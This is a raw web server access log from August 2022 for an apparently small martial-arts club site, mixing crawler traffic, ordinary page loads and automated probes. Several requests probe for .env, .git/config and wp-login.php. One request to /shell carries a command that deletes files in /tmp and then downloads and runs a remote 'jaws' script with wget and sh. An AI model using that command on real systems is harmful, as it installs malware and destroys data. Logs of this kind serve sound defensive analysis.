::ffff:46.38.249.150 - - [24/Aug/2022:06:49:07 +0000] "GET /wp-login.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
::ffff:18.237.176.162 - - [24/Aug/2022:06:51:31 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.1"
::ffff:207.46.13.113 - - [24/Aug/2022:06:55:18 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
::ffff:41.35.204.141 - - [24/Aug/2022:06:56:33 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+synns.cf/jaws;sh+/tmp/jaws HTTP/1.1" 404 144 "-" "Hello, world"
::ffff:46.161.11.238 - - [24/Aug/2022:07:06:48 +0000] "GET / HTTP/1.0" 200 58158 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36"
::ffff:46.161.11.238 - - [24/Aug/2022:07:06:50 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36"
::ffff:46.161.11.238 - - [24/Aug/2022:07:06:50 +0000] "GET /?err=error HTTP/1.0" 200 58710 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36"
::ffff:198.235.24.18 - - [24/Aug/2022:07:12:21 +0000] "GET / HTTP/1.1" 200 58158 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:52.25.74.68 - - [24/Aug/2022:07:13:32 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
::ffff:66.249.66.52 - - [24/Aug/2022:07:14:43 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.52 - - [24/Aug/2022:07:14:43 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:52.88.98.80 - - [24/Aug/2022:07:17:30 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
::ffff:40.77.167.22 - - [24/Aug/2022:07:23:22 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.86 - - [24/Aug/2022:07:26:12 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.168 - - [24/Aug/2022:07:34:19 +0000] "GET /index.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.254.196.115 - - [24/Aug/2022:07:35:06 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
